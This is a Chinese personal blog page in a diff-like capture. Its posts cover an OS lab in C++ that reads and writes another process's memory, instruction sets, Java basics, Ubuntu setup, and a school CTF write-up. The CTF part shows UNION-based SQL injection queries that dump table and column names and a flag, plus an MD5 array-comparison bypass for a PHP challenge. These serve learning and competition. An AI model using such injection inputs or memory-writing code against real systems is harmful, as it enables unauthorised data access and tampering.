href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 16px; color: #999">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 16px; color: #999">文件包含</a> <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size: 16px; color: #999">正则表达式</a> <a href="/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" style="font-size: 17.2px; color: #999ca1">消息队列</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 19.6px; color: #99a3b0">漏洞</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" style="font-size: 18.4px; color: #999fa8">环境配置</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 17.2px; color: #999ca1">计算机网络</a> <a href="/tags/%E8%BF%90%E7%BB%B4/" style="font-size: 17.2px; color: #999ca1">运维</a> <a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 16px; color: #999">面试</a></div></div></div><div class="card-widget card-archives"><div class="card-content"><div class="item-headline"><i class="fa fa-archive" aria-hidden="true"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/11/"><span class="card-archive-list-date">十一月 2022</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/07/"><span class="card-archive-list-date">七月 2022</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/08/"><span class="card-archive-list-date">八月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/07/"><span class="card-archive-list-date">七月 2021</span><span class="card-archive-list-count">9</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/03/"><span class="card-archive-list-date">三月 2021</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/01/"><span class="card-archive-list-date">一月 2021</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/08/"><span class="card-archive-list-date">八月 2020</span><span class="card-archive-list-count">8</span></a></li><li class="card-archive-list-item more is-center"><a class="card-archive-list-link-more" href="/archives">
-              <span>查看更多</span><i class="fa fa-angle-right" aria-hidden="true"></i></a></li></ul></div></div><div class="card-widget card-webinfo"><div class="card-content"><div class="item-headline"><i class="fa fa-line-chart" aria-hidden="true"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="webinfo-article-name">文章数目 :</div><div class="webinfo-article-count">45</div></div><div class="webinfo-item"><div class="webinfo-runtime-name">已运行时间 :</div><div class="webinfo-runtime-count" id="webinfo-runtime-count" start_date="4/6/2020 00:00:00">     </div></div><div class="webinfo-item">      <div class="webinfo-site-uv-name">本站访客数 :</div><div class="webinfo-site-uv-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="webinfo-site-name">本站总访问量 :</div><div class="webinfo-site-pv-count" id="busuanzi_value_site_pv"></div></div></div></div></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Dawnyh</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
- <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="/js/third-party/ClickShowText.js"></script><script src="/js/search/local-search.js"></script><script src="https://cdn.jsdelivr.net/npm/typed.js"></script><script>var subtitleEffect = true
-if (subtitleEffect) { 
-  var typed = new Typed("#subtitle", {
-    strings: 'Something for nothing.'.split(","),
-    startDelay: 300,
-    typeSpeed: 150,
-    loop: false,
-    backSpeed: 50
-  })
-} else {
-  document.getElementById("subtitle").innerHTML = 'Something for nothing.'
-}</script></body></html>
+void getSystemInfo(){
+
+	GetSystemInfo(&amp;systemInfo);
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区上界:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMaximumApplicationAddress&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;进程用户区起始:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.lpMinimumApplicationAddress&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;页面大小:&quot;&lt;&lt;setw(13)&lt;&lt;systemInfo.dwPageSize&lt;&lt;endl;
+
+
+	GlobalMemoryStatus(&amp;memstatus);
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;物理内存使用率:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwMemoryLoad&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;总物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPhys&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用物理内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPhys&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;总页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalPageFile&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用页文件:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailPageFile&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;总虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwTotalVirtual&lt;&lt;endl;
+	cout&lt;&lt;setw(15)&lt;&lt;&quot;可用虚拟内存:&quot;&lt;&lt;setw(13)&lt;&lt;memstatus.dwAvailVirtual&lt;&lt;endl;
+}
+
+
+void getProcessInfo(){
+	//为进程列表拍摄快照
+    HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
+    if(hProcessSnap==INVALID_HANDLE_VALUE){
+        printf(&quot;CreateToolhelp32Snapshot调用失败!\n&quot;);
+        exit(0);
+    }
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    //遍历进程快照。轮流显示每个进程的信息
+    BOOL bMore=Process32First(hProcessSnap,&amp;pe32);
+    int i=0;
+    printf(&quot;PID\t线程数\t进程名称\n&quot;);
+    while(bMore){
+
+        bMore=Process32Next(hProcessSnap,&amp;pe32);
+        _tprintf(_T(&quot;%u\t&quot;),pe32.th32ProcessID);
+        _tprintf(_T(&quot;%u\t&quot;),pe32.cntThreads);
+        _tprintf(_T(&quot;%s\n&quot;),pe32.szExeFile);
+
+        i++;
+    }
+    //清除snapshot对象
+    CloseHandle(hProcessSnap);
+    printf(&quot;进程总数:%d\n&quot;,i);
+}
+
+
+bool getMemoryBlock(DWORD dwProcessId){
+	MemList.clear();
+	HANDLE hProcess =INVALID_HANDLE_VALUE;
+	if(dwProcessId != GetCurrentProcessId()){
+		hProcess = OpenProcess( PROCESS_QUERY_INFORMATION|PROCESS_VM_READ , FALSE , dwProcessId);
+	}
+	if(hProcess == NULL){
+		return FALSE;
+	}
+	MEMORY_BASIC_INFORMATION  MemBaseInfo;
+	DWORD  dwInfoSize = sizeof(MEMORY_BASIC_INFORMATION);
+	DWORD  dwCurPos = (DWORD)systemInfo.lpMinimumApplicationAddress;
+	while(dwCurPos &lt; (DWORD) systemInfo.lpMaximumApplicationAddress ){
+		VirtualQueryEx( hProcess,(LPVOID)dwCurPos , &amp;MemBaseInfo,dwInfoSize);
+		MemList.push_back(MemBaseInfo);
+		dwCurPos = (DWORD) MemBaseInfo.BaseAddress + MemBaseInfo.RegionSize ;
+	}
+	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it = MemList.begin();
+	int num=0;
+	dwCurPos = (DWORD)(*it).BaseAddress;
+	for( ;it != MemList.end(); it++){
+		cout&lt;&lt;dec&lt;&lt;&quot;---- &quot;&lt;&lt;++num&lt;&lt;&quot; ----&quot;&lt;&lt;endl;
+		cout&lt;&lt;&quot;内存块基址: 0x&quot;&lt;&lt;hex&lt;&lt;dwCurPos&lt;&lt;endl;
+		cout&lt;&lt;&quot;保护方式：&quot;&lt;&lt;(*it).AllocationProtect&lt;&lt;endl;
+		cout&lt;&lt;&quot;区域大小：&quot;&lt;&lt;(*it).RegionSize&lt;&lt;endl;
+		cout&lt;&lt;&quot;状态：&quot;;
+		if((*it).State == MEM_COMMIT){
+			cout&lt;&lt;&quot;提交&quot;&lt;&lt;endl;
+		}else if((*it).State == MEM_FREE){
+			cout&lt;&lt;&quot;空闲&quot;&lt;&lt;endl;
+		}else if((*it).State == MEM_RESERVE){
+			cout&lt;&lt;&quot;保留&quot;&lt;&lt;endl;
+		}else{}
+		cout&lt;&lt;&quot;访问保护方式：&quot;;
+		if((*it).Protect == PAGE_READONLY){
+			cout&lt;&lt;&quot;只读&quot;&lt;&lt;endl;
+		}else if((*it).Protect == PAGE_READWRITE ){
+			cout&lt;&lt;&quot;读/写&quot;&lt;&lt;endl;
+		}else if((*it).Protect == PAGE_EXECUTE){
+			cout&lt;&lt;&quot;可执行&quot;&lt;&lt;endl;
+		}else if((*it).Protect == PAGE_EXECUTE_READ){
+			cout&lt;&lt;&quot;可执行/读&quot;&lt;&lt;endl;
+		}else if((*it).Protect == PAGE_EXECUTE_READWRITE){
+			cout&lt;&lt;&quot;可执行/读写&quot;&lt;&lt;endl;
+		}else if((*it).Protect == PAGE_NOACCESS){
+			cout&lt;&lt;&quot;不允许存储&quot;&lt;&lt;endl;
+		}
+		cout&lt;&lt;&quot;类型：&quot;;
+		if((*it).Type == MEM_IMAGE){
+			cout&lt;&lt;&quot;映像&quot;&lt;&lt;endl;
+		}else if((*it).Type == MEM_MAPPED){
+			cout&lt;&lt;&quot;映射&quot;&lt;&lt;endl;
+		}else if((*it).Type == MEM_PRIVATE){
+			cout&lt;&lt;&quot;私有&quot;&lt;&lt;endl;
+		}else{}
+		dwCurPos+=(*it).RegionSize ;
+	}
+	return true;
+}
+
+
+bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue){
+	AddrList.clear();
+	if(MemList.empty()){
+		return false;
+	}
+	HANDLE hProcess = INVALID_HANDLE_VALUE;
+	if(dwProcessId !=GetCurrentProcessId()){
+		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,dwProcessId);
+		if(hProcess ==NULL)
+			return false;
+	}
+	LPBYTE lpBuff = new BYTE[systemInfo.dwPageSize];
+	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it;
+	for(it=MemList.begin();it!=MemList.end();it++){
+		if(it-&gt;State != MEM_COMMIT){
+			continue;
+		}
+		DWORD dwSize =0;
+		SIZE_T dwReadBytes=0;
+		while(dwSize &lt; it-&gt;RegionSize){
+			LPVOID lpAddr = (LPVOID)((DWORD)it-&gt;BaseAddress+dwSize);
+			if(ReadProcessMemory(hProcess,lpAddr,lpBuff,systemInfo.dwPageSize,&amp;dwReadBytes)==FALSE){
+				dwSize +=systemInfo.dwPageSize;
+				continue;
+			}
+			for(int i=0;i&lt;dwReadBytes -3;i++){
+				if(*((DWORD *)(lpBuff+i)) ==dwValue){
+					AddrList.push_back((DWORD)lpAddr+i);
+				}
+				if(AddrList.size()==MAX_ADDR_NUM){
+					delete []lpBuff;
+					CloseHandle(hProcess);
+					return true;
+				}
+			}
+			dwSize+=systemInfo.dwPageSize;
+		}
+	}
+	delete []lpBuff;
+	CloseHandle(hProcess);
+	return true;
+}
+
+
+bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue){
+	HANDLE hProcess = INVALID_HANDLE_VALUE;
+	if(dwProcessId !=GetCurrentProcessId()){
+		hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);
+		if(hProcess ==NULL)
+			return false;
+	}
+	SIZE_T dwWriteBytes =0;
+	DWORD dwOldProtect;
+	if(!VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,sizeof(DWORD),PAGE_EXECUTE_READWRITE,&amp;dwOldProtect)){
+		cout&lt;&lt;&quot;protect!&quot;&lt;&lt;endl;
+		DWORD dwReturn = GetLastError();
+		cout&lt;&lt;dwReturn&lt;&lt;endl;
+	}
+	if(!WriteProcessMemory(hProcess,(LPVOID)dwTagAddr,&amp;dwValue,sizeof(DWORD),&amp;dwWriteBytes)){
+		cout&lt;&lt;&quot;write failed&quot;&lt;&lt;endl;
+		DWORD dwReturn = GetLastError();
+		cout&lt;&lt;dwReturn&lt;&lt;endl;
+		return false;
+	}
+	VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,sizeof(DWORD),dwOldProtect,NULL);
+	CloseHandle(hProcess);
+		return true;
+}
+</code></pre>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2020-06-18T16:00:00.000Z" itemprop="datePublished">2020-06-19</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/">专业课</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%9E%E9%AA%8C/" rel="tag">实验</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="tag">操作系统</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
+id="post-专业课/操作系统/指令集和操作系统位数"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2020/06/10/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/">指令集和操作系统位数</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h2 id="指令集"><a class="header-anchor" href="#指令集"></a>指令集</h2>
+<p>为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。</p>
+<h3 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h3>
+<p>完整的，复杂的指令集称作<code>CISC</code> (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体管的严重浪费，所以亨尼西和帕特森等人提出了一种更加简单的指令集，叫做精简指令集<code>RISC</code> (Reduced Instruction Set Computing)</p>
+<p><code>X86</code>是英特尔推出的一种CPU架构，采用复杂指令集CISC</p>
+<p><code>ARM</code>是acorn公司设计的CPU架构，采用精简指令集RISC</p>
+<h2 id="操作系统位数"><a class="header-anchor" href="#操作系统位数"></a>操作系统位数</h2>
+<p>首先明确<code>CPU位数</code>的概念，CPU位数即CPU在一个时钟周期内能够处理的二进制串的位数，也是CPU寄存器的位数。目前64位的CPU是主流。</p>
+<p>而<strong>操作系统位数</strong>即操作系统所依赖的指令集位数，可以理解为：32位的操作系统假定CPU是32位的，64位操作系统则假定CPU是64位的。所以，64位CPU的主机可以安装64位和32位甚至更低位数的操作系统，而32位CPU的主机只能安装32位及以下的操作系统（即向下兼容）。</p>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2020-06-09T16:00:00.000Z" itemprop="datePublished">2020-06-10</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/%E4%B8%93%E4%B8%9A%E8%AF%BE/">专业课</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="tag">操作系统</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
+id="post-CTF/比赛/ACTF校赛Web"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/">ACTF校赛Web</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
+<h3 id="题目：签到"><a class="header-anchor" href="#题目：签到"></a>题目：签到</h3>
+<p><strong>flag值：ACTF{WeLc0mm_tO_acTf}</strong></p>
+<p>关注公众号，回复“一句话”即可</p>
+<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
+<h3 id="题目：Column-Permutation-Cipher"><a class="header-anchor" href="#题目：Column-Permutation-Cipher"></a>题目：Column Permutation Cipher</h3>
+<p><strong>flag值：actf{welcome_to_the_world_of_cryptography}</strong></p>
+<p>列换位密码，用密码学实验的脚本跑一下</p>
+<pre><code class="language-python">secret=&quot;&quot;
+secret=input(&quot;ciphertext:&quot;)
+length=len(secret)
+print(length)
+answer=&quot;&quot;
+for n in range(2,26):
+    k=length
+    while k%n!=0:
+        k=k+1
+    m=k//n
+    answer=&quot;&quot;
+    for i in range(m):
+        for j in range(i,length,m):
+            answer+=secret[j]
+        if ' is ' in answer :
+            print(&quot;############&quot;)
+            print(answer)
+</code></pre>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200606101942263.png" alt="image-20200606101942263"></p>
+<h2 id="Web"><a class="header-anchor" href="#Web"></a>Web</h2>
+<h3 id="题目：sql注入入门题"><a class="header-anchor" href="#题目：sql注入入门题"></a>题目：sql注入入门题</h3>
+<p><strong>flag值：（没记。。）</strong></p>
+<p>一个数字型SQL回显注入</p>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222156910.png" alt="image-20200529222156910"></p>
+<p>首先猜出字段数为4</p>
+<p>联合查询得到数据库名</p>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222846198.png" alt="image-20200529222846198"></p>
+<p>数据表名</p>
+<pre><code>union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema='easy_sql_injection'
+</code></pre>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223409586.png" alt="image-20200529223409586"></p>
+<p>列名</p>
+<pre><code>union select group_concat(column_name),2,3,4 from information_schema.columns where table_name='Notice'
+</code></pre>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223713519.png" alt="image-20200529223713519"></p>
+<p>读取数据</p>
+<pre><code>union select group_concat(flag),2,3,4 from Notice
+</code></pre>
+<p>得到flag</p>
+<h3 id="题目：PHP代码审计入门题"><a class="header-anchor" href="#题目：PHP代码审计入门题"></a>题目：PHP代码审计入门题</h3>
+<p><strong>flag值：（没记。。）</strong></p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+include_once &quot;flag.php&quot;;
+show_source(__FILE__);
+
+session_start();
+
+
+if(!isset($_POST['key'])) {
+    die(&quot;not allow!&quot;);
+}
+
+if($_POST['key'] != $_SESSION['key']) {
+    die(&quot;Wrong key!&quot;);
+}
+
+if(isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {
+    if($_GET['username'] == $_GET['password']) {
+        die(&quot;Your password can not be your username!&quot;);
+    }
+    if(md5($_GET['username']) === md5($_GET['password'])) {
+        echo $flag;
+    }
+}
+</code></pre>
+<p>第一次登录时，SESSION为空，所以POST一个<code>key=</code>即可，然后是md5，</p>
+<p><code>username[]=1</code> <code>password[]=2</code>即可满足条件</p>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2020-06-04T16:00:00.000Z" itemprop="datePublished">2020-06-05</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/CTF/">CTF</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
+id="post-编程语言/Java/异常及处理"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/">Java 异常及处理</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
+<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
+<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
+<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
+<p>不处理异常，将异常抛出给调用者。</p>
+<p><code>throw</code>  、<code>throws</code></p>
+<p>（挖坑待填）</p>
+<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
+<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
+<ol>
+<li>可能出现异常的代码用<code>try</code>块括起来</li>
+<li>用<code>catch</code>块来捕获异常并处理异常</li>
+<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
+</ol>
+<p><strong>代码执行过程的三种情况</strong></p>
+<ol>
+<li>
+<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
+</li>
+<li>
+<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
+</li>
+<li>
+<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
+</li>
+</ol>
+<blockquote>
+<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
+<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
+</blockquote>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2020-05-15T16:00:00.000Z" itemprop="datePublished">2020-05-16</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
+id="post-环境配置/Ubuntu (20.04)虚拟机安装配置"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/">Ubuntu (20.04)虚拟机安装配置</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
+<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
+<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
+<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
+<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
+<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
+<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2020-05-11T16:00:00.000Z" itemprop="datePublished">2020-05-12</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="tag">环境配置</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
+id="post-编程语言/Java/抽象类和接口"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3/">Java 抽象类和接口</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h2 id="抽象类"><a class="header-anchor" href="#抽象类"></a>抽象类</h2>
+<p>作用：主要起到一个模板的作用，抽象类中的抽象方法必须被子类实现，这样就可以使用一个统一的方法名来调用子类方法。</p>
+<p>抽象类无法直接创建对象，必须被继承；抽象方法也必须在子类中被重写。</p>
+<p>抽象类中的方法可以是非抽象的（即可以有方法体），但即使类中没有抽象方法，抽象类也无法被实例化；反过来，如果一个类中有抽象方法，那么这个类必须声明为抽象类。</p>
+<p>抽象方法没有方法体。</p>
+<p>关键字：<code>abstract</code></p>
+<pre><code>public abstract Class1{
+	public abstract void fun();
+}
+</code></pre>
+<h2 id="接口"><a class="header-anchor" href="#接口"></a>接口</h2>
+<p>接口和抽象类有点像，它是抽象方法的集合；</p>
+<p>一个类只能继承自一个父类，但是可以实现多个接口。间接实现了多继承；</p>
+<p>另外接口中可以有有成员变量，但默认都是 <code>public static final</code>的，这三个关键字可以省略；</p>
+<p>接口中的方法默认都是抽象的（即不能有方法体），定义时可以不写<code>abstract</code>，实现接口的类必须实现接口中定义的所有方法，否则该类必须为抽象类。</p>
